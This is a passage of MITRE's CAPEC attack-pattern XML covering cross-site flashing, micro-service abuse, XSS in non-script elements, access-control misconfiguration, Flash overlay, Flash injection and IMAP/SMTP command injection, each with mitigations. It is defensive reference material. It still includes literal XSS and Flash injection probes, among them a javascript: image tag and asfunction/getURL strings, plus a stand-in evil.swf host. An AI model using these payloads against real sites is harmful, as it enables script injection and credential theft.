            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Identification] Using a browser or an automated tool, an attacker records all instances of URLs (or partial URL such as domain) passed to a flash file (SWF).</Description>
               <Technique>Use an automated tool to record the variables passed to a flash file.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how the flash file receive variables, e.g. JavaScript using SetVariable/GetVariable, HTML FlashVars param tag, etc.</Technique>
               <Technique>Use decompilers to retrieve the flash source code and record all user-controllable variables passed to a loadMovie* directive.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Attempt to inject a remote flash file] The attacker makes use of a remotely available flash file (SWF) that generates a uniquely identifiable output when executed inside the targeted flash file.</Description>
               <Technique>Modify the variable of the SWF file that contains the remote movie URL to the attacker controlled flash file.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Access or Modify Flash Application Variables] As the attacker succeeds in exploiting the vulnerability, he targets the content of the flash application to steal variable content, password, etc.</Description>
               <Technique>Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and loaded by the victim browser's flash plugin and sends document information to the attacker.</Technique>
               <Technique>Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the flash application to execute appropriately.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Execute JavaScript in victim's browser] When the attacker targets the current flash application, he can choose to inject JavaScript in the client's DOM and therefore execute cross-site scripting attack.</Description>
               <Technique>Develop malicious JavaScript that is injected from the rogue flash movie to the targeted flash application through vectors identified during the Experiment Phase and loaded by the victim's browser.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The targeted Flash application must reference external URLs and the locations thus referenced must be controllable through parameters. The Flash application must fail to sanitize such parameters against malicious manipulation. The victim must follow a crafted link created by the attacker.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">knowledge of Flash internals, parameters and remote referencing.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implementation: Only allow known URL to be included as remote flash movies in a flash application</Mitigation>
            <Mitigation>Configuration: Properly configure the crossdomain.xml file to only include the known domains that should host remote flash movies.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>The attacker tries to get his malicious flash movie to be executed in the targeted flash application. The malicious file is hosted on the attacker.com domain and the targeted flash application is hosted on example.com The crossdomain.xml file in the root of example.com allows all domains and no specific restriction is specified in the targeted flash application. When the attacker injects his malicious file in the vulnerable flash movie, the rogue flash application is able to access internal variables and parameter of the flash movie.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-41"/>
            <Reference External_Reference_ID="REF-42" Section="Testing for Cross site flashing (OWASP-DV-004)"/>
            <Reference External_Reference_ID="REF-561"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences, References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="179" Name="Calling Micro-Services Directly" Abstraction="Standard" Status="Draft">
         <Description>An attacker is able to discover and query Micro-services at a web location and thereby expose the Micro-services to further exploitation by gathering information about their implementation and function. Micro-services in web pages allow portions of a page to connect to the server and update content without needing to cause the entire page to update. This allows user activity to change portions of the page more quickly without causing disruptions elsewhere. However, these micro-services may not be subject to the same level of security review as other forms of content. For example, a micro-service that posts requests to a server that are turned into SQL queries may not adequately protect against SQL-injection attacks. As a result, micro-services may provide another vector for a range of attacks. It should be emphasized that the presence of micro-services does not necessarily make a site vulnerable to attack, but they do provide additional complexity to a web page and therefore may contain vulnerabilities that support other attack patterns.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="554"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target site must use micro-services that interact with the server and one or more of these micro-services must be vulnerable to some other attack pattern.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker usually needs to be able to invoke micro-services directly in order to control the parameters that are used in their attack. The attacker may require other resources depending on the nature of the flaw in the targeted micro-service.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">Discovering, querying, and finally calling micro-services, such as w/ AJAX</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="18" Name="XSS Targeting Non-Script Elements" Abstraction="Detailed" Status="Draft">
         <Description>This attack is a form of Cross-Site Scripting (XSS) where malicious scripts are embedded in elements that are not expected to host scripts such as image tags (&lt;img&gt;), comments in XML documents (&lt; !-CDATA-&gt;), etc. These tags may not be subject to the same input validation, output validation, and other content filtering and checking routines, so this can create an opportunity for an attacker to tunnel through the application's elements and launch a XSS attack through other elements. As with all remote attacks, it is important to differentiate the ability to launch an attack (such as probing an internal network for unpatched servers) and the ability of the remote attacker to collect and interpret the output of said attack.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="591"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="592"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="588"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Spider] Using a browser or an automated tool, an attacker records all entry points for inputs that happen to be reflected in a client-side non-script element. These non-script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.</Description>
               <Technique>Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.</Technique>
               <Technique>Use a proxy tool to record all links visited during a manual traversal of the web application.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Probe identified potential entry points for XSS vulnerability] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.</Description>
               <Technique>Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).</Technique>
               <Technique>Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).</Technique>
               <Technique>Use a proxy tool to record results of the created requests.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>5</Step>
               <Phase>Exploit</Phase>
               <Description>[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target client software must allow the execution of scripts generated by remote hosts.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To achieve a redirection and use of less trusted source, an adversary can simply edit content such as XML payload or HTML files that are sent to client machine.</Skill>
            <Skill Level="High">Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to include malicious script in document, e.g. HTML file, or XML document. Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>In addition to the traditional input fields, all other user controllable inputs, such as image tags within messages or the likes, must also be subjected to input validation. Such validation should ensure that content that can be potentially interpreted as script by the browser is appropriately filtered.</Mitigation>
            <Mitigation>All output displayed to clients must be properly escaped. Escaping ensures that the browser interprets special scripting characters literally and not as script to be executed.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. A malicious user embeds JavaScript in the IMG tags in his messages that gets executed within the victim's browser whenever the victim reads these messages.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">&lt;img src=javascript:alert('XSS')&gt;</xhtml:div>
               <xhtml:p>When executed within the victim's browser, the malicious script could accomplish a number of adversary objectives including stealing sensitive information such as usernames, passwords, or cookies.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="80"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Examples-Instances, Related_Attack_Patterns, Related_Vulnerabilities, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-05-01">Embedding Scripts in Non-Script Elements</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="180" Name="Exploiting Incorrectly Configured Access Control Security Levels" Abstraction="Standard" Status="Draft">
         <Description>An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack. Most commonly, attackers would take advantage of controls that provided too little protection for sensitive activities in order to perform actions that should be denied to them. In some circumstances, an attacker may be able to take advantage of overly restrictive access control policies, initiating denial of services (if an application locks because it unexpectedly failed to be granted access) or causing other legitimate actions to fail due to security. The latter class of attacks, however, is usually less severe and easier to detect than attacks based on inadequate security restrictions. This attack pattern differs from CAPEC 1, "Accessing Functionality Not Properly Constrained by ACLs" in that the latter describes attacks where sensitive functionality lacks access controls, where, in this pattern, the access control is present, but incorrectly configured.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="122"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey] The attacker surveys the target application, possibly as a valid and authenticated user.</Description>
               <Technique>Spider the web site for all available links.</Technique>
               <Technique>Brute force to guess all function names/action with different privileges.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Identify weak points in access control configurations] The attacker probes the access control for functions and data identified in the Explore phase to identify potential weaknesses in how the access controls are configured.</Description>
               <Technique>The attacker attempts authenticated access to targeted functions and data.</Technique>
               <Technique>The attacker attempts unauthenticated access to targeted functions and data.</Technique>
               <Technique>The attacker attempts indirect and side channel access to targeted functions and data.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Access the function or data bypassing the access control] The attacker executes the function or accesses the data identified in the Explore phase bypassing the access control.</Description>
               <Technique>The attacker executes the function or accesses the data not authorized to him.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target must apply access controls, but incorrectly configure them. However, not all incorrect configurations can be exploited by an attacker. If the incorrect configuration applies too little security to some functionality, then the attacker may be able to exploit it if the access control would be the only thing preventing an attacker's access and it no longer does so. If the incorrect configuration applies too much security, it must prevent legitimate activity and the attacker must be able to force others to require this activity..</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">In order to discover unrestricted resources, the attacker does not need special tools or skills. He only has to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Configure the access control correctly.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>For example, an incorrectly configured Web server, may allow unauthorized access to it, thus threaten the security of the Web application.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="732"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-29"/>
            <Reference External_Reference_ID="REF-45" Section="OWASP Top 10 2007 – Malicious File Execution"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="181" Name="Flash File Overlay" Abstraction="Detailed" Status="Draft">
         <Description>An attacker creates a transparent overlay using flash in order to intercept user actions for the purpose of performing a clickjacking attack. In this technique, the Flash file provides a transparent overlay over HTML content. Because the Flash application is on top of the content, user actions, such as clicks, are caught by the Flash application rather than the underlying HTML. The action is then interpreted by the overlay to perform the actions the attacker wishes.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="103"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The victim must be tricked into navigating to the attackers' decoy site and performing the actions on the decoy page.</Prerequisite>
            <Prerequisite>The victim's browser must support invisible Flash overlays.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must be able to force the Flash overlay over the decoy content.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="1021"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="182" Name="Flash Injection" Abstraction="Standard" Status="Draft">
         <Description>An attacker tricks a victim to execute malicious flash content that executes commands or makes flash calls specified by the attacker. One example of this attack is cross-site flashing, an attacker controlled parameter to a reference call loads from content specified by the attacker.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="137"/>
            <Related_Attack_Pattern Nature="CanAlsoBe" CAPEC_ID="248"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Find Injection Entry Points] The attacker first takes an inventory of the entry points of the application.</Description>
               <Technique>Spider the website for all available URLs that reference a Flash application.</Technique>
               <Technique>List all uninitialized global variables (such as _root.*, _global.*, _level0.*) in ActionScript, registered global variables in included files, load variables to external movies.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Determine the application's susceptibility to Flash injection] Determine the application's susceptibility to Flash injection. For each URL identified in the explore phase, the attacker attempts to use various techniques such as direct load asfunction, controlled evil page/host, Flash HTML injection, and DOM injection to determine whether the application is susceptible to Flash injection.</Description>
               <Technique>Test the page using direct load asfunction, getURL,javascript:gotRoot("")///d.jpg</Technique>
               <Technique>Test the page using controlled evil page/host, http://example.com/evil.swf</Technique>
               <Technique>Test the page using Flash HTML injection, "'&gt;&lt;img src='asfunction:getURL,javascript:gotRoot("")//.jpg' &gt;</Technique>
               <Technique>Test the page using DOM injection, (gotRoot(''))</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Inject malicious content into target] Inject malicious content into target utilizing vulnerable injection vectors identified in the Experiment phase</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target must be capable of running Flash applications. In some cases, the victim must follow an attacker-supplied link.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The attacker needs to have knowledge of Flash, especially how to insert content the executes commands.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. The attacker may need to be able to serve the injected Flash content.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>Information Leakage</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implementation: remove sensitive information such as user name and password in the SWF file.</Mitigation>
            <Mitigation>Implementation: use validation on both client and server side.</Mitigation>
            <Mitigation>Implementation: remove debug information.</Mitigation>
            <Mitigation>Implementation: use SSL when loading external data</Mitigation>
            <Mitigation>Implementation: use crossdomain.xml file to allow the application domain to load stuff or the SWF file called by other domain.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>In the following example, the SWF file contains</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">getURL('javascript:SomeFunc("someValue")','','GET')</xhtml:div>
               <xhtml:p>A request like</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://example.com/noundef.swf?a=0:0;alert('XSS')</xhtml:div>
               <xhtml:p>becomes</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">javascript:SomeFunc("someValue")?a=0:0;alert(123)</xhtml:div>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="184"/>
            <Related_Weakness CWE_ID="697"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-46"/>
            <Reference External_Reference_ID="REF-47"/>
            <Reference External_Reference_ID="REF-48"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="183" Name="IMAP/SMTP Command Injection" Abstraction="Standard" Status="Draft">
         <Description>An attacker exploits weaknesses in input validation on IMAP/SMTP servers to execute commands on the server. Web-mail servers often sit between the Internet and the IMAP or SMTP mail server. User requests are received by the web-mail servers which then query the back-end mail server for the requested information and return this response to the user. In an IMAP/SMTP command injection attack, mail-server commands are embedded in parts of the request sent to the web-mail server. If the web-mail server fails to adequately sanitize these requests, these commands are then sent to the back-end mail server when it is queried by the web-mail server, where the commands are then executed. This attack can be especially dangerous since administrators may assume that the back-end server is protected against direct Internet access and therefore may not secure it adequately against the execution of malicious commands.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="248"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target environment must consist of a web-mail server that the attacker can query and a back-end mail server. The back-end mail server need not be directly accessible to the attacker.</Prerequisite>
            <Prerequisite>The web-mail server must fail to adequately sanitize fields received from users and passed on to the back-end mail server.</Prerequisite>
            <Prerequisite>The back-end mail server must not be adequately secured against receiving malicious commands from the web-mail server.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. However, in most cases, the attacker will need to be a recognized user of the web-mail server.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="77"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-49" Section="Testing for IMAP/SMTP Injection (OWASP-DV-011)"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="184" Name="Software Integrity Attack" Abstraction="Meta" Status="Draft">
         <Description>An attacker initiates a series of events designed to cause a user, program, server, or device to perform actions which undermine the integrity of software code, device data structures, or device firmware, achieving the modification of the target's integrity to achieve an insecure state.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Skills_Required>
            <Skill Level="Medium">Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the attacker to host a payload and then trigger the installation of the payload code.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Software Integrity Attacks are usually a late stage focus of attack activity which depends upon the success of a chain of prior events. The resources required to perform the attack vary with respect to the overall attack strategy, existing countermeasures which must be bypassed, and the success of early phase attack vectors.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="494"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
